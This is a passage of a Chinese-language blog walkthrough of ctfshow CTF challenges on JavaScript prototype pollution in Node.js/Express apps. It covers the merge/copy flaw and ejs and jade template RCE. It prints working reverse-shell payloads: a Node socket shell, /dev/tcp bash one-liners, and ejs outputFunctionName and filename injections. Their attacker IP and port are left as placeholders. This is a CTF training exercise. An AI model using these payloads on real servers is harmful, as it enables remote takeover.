<p>哑火了，payload并没有达到我们的预期，用JavaScript创建o2的过程（let o2 = {a: 1, “__proto__“: {b: 2}}）中，__proto__已经代表o2的原型了，我们的键值相当于自定义了一个原型对象，没法在新的对象中添加__proto__键值，此时遍历o2的所有键名，拿到的只是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。</p>
<p>那么，如何让__proto__被认为是一个键名呢？用JSON解析一下键值对(JSON.parse 会把一个json字符串 转化为 javascript的object)，将代码改成如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">let</span> o<span class="hljs-number">1</span> = &#123;&#125; <br><span class="hljs-attribute">let</span> o<span class="hljs-number">2</span> = JSON.parse(&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;&#x27;) //?数组元素双引号<br><span class="hljs-attribute">merge</span>(o<span class="hljs-number">1</span>, o<span class="hljs-number">2</span>) <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">1</span>.a, o<span class="hljs-number">1</span>.b) <br><span class="hljs-attribute">o3</span> = &#123;&#125; <br><span class="hljs-attribute">console</span>.log(o<span class="hljs-number">3</span>.b)<br></code></pre></td></tr></table></figure>

<p>可见，新建的o3对象，也存在b属性，说明Object已经被污染，因为JSON解析下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍o2时会存在这个键</p>
<p>merge操作时最常见的可能控制键名的操作，也最能被原型链攻击，很多常见的库都存在这个问题</p>
<p>有哪些情况原型链会被污染？哪些情况原型链能被修改呢？哪些情况下我们可以设置__proto__的值呢？<br>其实找找能够控制数组（对象）的“键名”的操作即可：    </p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<blockquote>
<p>存在影响目标类型的同型，该同型的参数可控</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/%E6%B1%A1%E6%9F%93.png" srcset="/img/loading.gif" lazyload></p>
<p><strong>原型链污染</strong>利用的关键就是找到可以覆盖的属性或者方法。</p>
<p>这类漏洞的关键主要是在 compile编译 截断，通过原型链污染覆盖某些属性，在编译过程中注入模板，在渲染的时候就会执行我们注入的恶意代码。</p>
<p>限制：</p>
<ul>
<li>保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常</li>
<li>被覆盖的属性无硬编码默认值</li>
</ul>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>下载附件</p>
<blockquote>
<p>npm install</p>
<p>node bin/www</p>
</blockquote>
<p>index.js：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; title: <span class="hljs-string">&#x27;Express&#x27;</span> &#125;);<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure>

<p>login.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span>+JSON.stringify(user)&#125;);  <br>  &#125;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure>

<p>common.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = &#123;<br>  copy:copy<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (let key in object2) &#123;<br>        <span class="hljs-keyword">if</span> (key in object2 &amp;&amp; key in object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>首页貌似没啥用，在login.js中看到secert没有ctfshow这个属性，而<code>secert.ctfshow===&#39;36dboy&#39;</code>就有flag，我们发现select是一个数组，而user也是一个数组(具有同型)，而且通过<code>utils.copy(user,req.body)</code>传入数值(copy和merge类比)，req.body是POST请求(参数可控)</p>
<p>那么抓包传入即可</p>
<blockquote>
<p>{“__proto__“:{“ctfshow”:”36dboy”}}</p>
</blockquote>
<h4 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user, req.body);<br>  <span class="hljs-keyword">if</span> (secert.ctfshow === flag) &#123;<br>    res.end(flag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span> + JSON.stringify(user) &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>和338不同的是ctfshow===变量，我们可知最后的32位字符串就在这变量flag，是不可预测的值；多了一个api.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; query: <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">query</span>)(<span class="hljs-params">query</span>)&#125;)</span>;   <br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure>

<p>然后我们污染点一样，仍然是</p>
<blockquote>
<p>  let user = {};<br>  utils.copy(user,req.body);</p>
</blockquote>
<p>触发点：</p>
<blockquote>
<p>res.render(‘api’, { query: Function(query)(query)}); </p>
</blockquote>
<p>匿名函数，和Code-Breaking Thejs很相像</p>
<blockquote>
<p>Function(query)(query)这种匿名函数的写法，query不再是传数值，而是传入执行代码，然后自执行。有点和eval类似，但这里更好的解释是Function对象</p>
<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p>
<p>官方是这样定义的：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的  JavaScript 函数。</p>
</blockquote>
<p>然后想法是通过login.js的copy污染到api.js的query，反弹一个shell</p>
<p>js如何反弹shell<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//js原生socket建立连接</span><br><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, [])<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br><span class="hljs-comment">//污染传入</span><br>&#123;<br>	<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>	<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>	&#125;<br>&#125;<br><br><span class="hljs-comment">//拼接</span><br>&#123;<br>	<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>	<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = require(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = require(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>需要对上面的代码”格式化“，payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>传入拼接完成的payload，post传至/login，接着访问/api触发后无响应，检查发现隧道启动成功，但是没有任何连接</p>
<p>解释如下：</p>
<ul>
<li>Function中require是模块内的，无法调用全局变量</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/nodejs/node-v0.x-archive/issues/2017">https://github.com/nodejs/node-v0.x-archive/issues/2017</a>  </p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211121223733792.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a> </p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122000430212.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing">https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing</a></p>
<p>此处的匿名函数原型是通过<code>new Function()</code>创建而来的，也就是说等价于上面的截图情形，没法直接在<code>Function</code>中引入 <code>require</code></p>
<p>总结就是，使用的是nodejs搭建的服务，可以使用require，但它无法在匿名函数内调用全局变量(http)，换一种写法</p>
<blockquote>
<p>var require = global.require || global.process.mainModule.constructor._load</p>
</blockquote>
<p>同时对于这个问题，我们看到nodejs是面向服务器端的，它具有require关键字，但在浏览器的控制台是没有的</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, []);<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br>&#123;<br>	<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br>	<span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;query&quot;</span>:<span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>如果是 windows 系统就把 <code>/bin/sh</code> 换成 <code>cmd.exe</code> 就可以了</p>
<h4 id="ctfshow-340"><a href="#ctfshow-340" class="headerlink" title="ctfshow 340"></a>ctfshow 340</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.userinfo = <span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.isVIP = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.isAdmin = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.isAuthor = <span class="hljs-literal">false</span>;     <br>    &#125;;<br>  &#125;<br>  utils.copy(user.userinfo,req.body);<br>  <span class="hljs-keyword">if</span>(user.userinfo.isAdmin)&#123;<br>   res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-keyword">return</span> res.json(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>&#125;); <br>  &#125;<br>&#125;);<br><span class="hljs-built_in">module</span>.exports = router;<br></code></pre></td></tr></table></figure>

<p>这里面的userinfo原型不同了</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122183340194.png" srcset="/img/loading.gif" lazyload></p>
<p>再套一个<code>__proto__</code>即可</p>
<h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>这里介绍两个自动化找洞：</p>
<p>snyk的使用</p>
<p>在官网注册登录，初次登录要关联Github，找到api，本地：</p>
<blockquote>
<p>npm install snyk -g </p>
<p>snyk config set api=</p>
<p>snyk test</p>
</blockquote>
<p>audit的使用</p>
<blockquote>
<p>npm audit</p>
</blockquote>
<ul>
<li>ejs</li>
</ul>
<p>因为这题没有/api触发点，使用338存在的ejs RCE，因为是非预期没有放出来，使用snyk扫出来</p>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>还有一个入口outputFunctionName：<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>注意到login.js的<code>this.userinfo = new function()&#123;...</code>所以上面的payload再嵌套一个<code>__proto__</code></p>
<h4 id="ctfshow342、343"><a href="#ctfshow342、343" class="headerlink" title="ctfshow342、343"></a>ctfshow342、343</h4><ul>
<li>jade</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p>
<p><a target="_blank" rel="noopener" href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172124317.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172422442.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172602483.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172725768.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124173907879.png" srcset="/img/loading.gif" lazyload></p>
<p>js调试真的一坨坨的Orz</p>
<p>this.engine跟进</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174739562.png" srcset="/img/loading.gif" lazyload></p>
<p>继续跟进</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174952093.png" srcset="/img/loading.gif" lazyload></p>
<p>可见返回值处：</p>
<blockquote>
<p>return handleTemplateCache(options)(options);</p>
</blockquote>
<p>跟进一下handleTemplateCache</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001447005.png" srcset="/img/loading.gif" lazyload></p>
<p>跟一下compile<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001503138.png" srcset="/img/loading.gif" lazyload></p>
<p>先看一下parse</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003052754.png" srcset="/img/loading.gif" lazyload></p>
<p>parser内，tokens被内部parse后传到compiler被compile，赋为js的值，js被部分传入body内</p>
<p>看一下compile，它是compiler的函数，去node_module找</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003818514.png" srcset="/img/loading.gif" lazyload></p>
<p>返回buf传回compile</p>
<p>跟进66行this.visit(this.node);<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082102153.png" srcset="/img/loading.gif" lazyload></p>
<p>this.debug=true时node.filename被stringify转换为字符串 node.line随着被push进buf</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082655288.png" srcset="/img/loading.gif" lazyload></p>
<p>this.visitNode(node);遍历ast树后回到compile<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084259360.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084511998.png" srcset="/img/loading.gif" lazyload></p>
<p>node.line被记录到fn中，然后</p>
<blockquote>
<p>fn = new Function(‘locals, jade’, fn);</p>
</blockquote>
<p>那么我们的污染点就出来了，<strong>污染到node.line就可以运行代码了</strong></p>
<h5 id="碰到问题"><a href="#碰到问题" class="headerlink" title="碰到问题"></a>碰到问题</h5><p>post /login</p>
